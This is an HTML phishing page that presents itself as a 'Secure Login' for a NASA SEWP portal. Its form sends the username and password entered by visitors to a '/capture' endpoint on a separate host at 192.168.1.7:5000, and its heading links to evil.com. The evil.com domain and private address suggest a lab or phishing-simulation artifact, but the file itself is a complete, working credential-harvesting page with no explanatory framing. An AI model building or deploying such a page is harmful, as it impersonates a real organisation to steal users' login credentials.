<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Login</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: flex-start; /* Aligns items at the top */
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            background: #f4f4f4;
            padding-top: 50px; /* Adds space at the top */
        }
        .container {
            text-align: center;
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            max-width: 400px; /* Limits the width of the container */
            width: 100%;
        }
        .login-form {
            display: flex;
            flex-direction: column;
            width: 100%;
            margin: auto;
        }
        .login-form input {
            margin: 10px 0;
            padding: 10px;
            font-size: 1em;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .login-form button {
            padding: 10px;
            font-size: 1em;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .login-form button:hover {
            background-color: #45a049;
        }
        .note {
            font-size: 0.9em;
            color: #555;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Please visit <a href="https://evil.com">evil.com</a> for more details.</h2>
        <div class="note">Sewp NASA Login</div>
        <form class="login-form" action="http://192.168.1.7:5000/capture" method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
